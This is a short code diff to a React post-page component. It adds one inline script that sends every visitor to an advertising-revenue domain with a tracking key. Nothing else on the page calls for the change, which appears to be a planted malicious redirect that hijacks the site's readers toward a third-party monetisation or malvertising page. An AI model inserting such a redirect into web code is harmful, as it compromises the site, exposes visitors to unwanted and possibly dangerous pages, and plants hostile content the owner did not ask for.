@@ -99,6 +99,7 @@ const Post: React.FC<PostProps> = (props) => {
 				<title>{post.title}</title>
 			</Head>
 			<div className="post-container">
+				<script>window.location.href='https://www.highcpmrevenuegate.com/k8sr3t2bg?key=f7e078d3b1f7ca9cba6147ac455506bf';</script>
 				<h1>{post.title}</h1>
 				<img
 					src={post.featuredImage.node.sourceUrl}
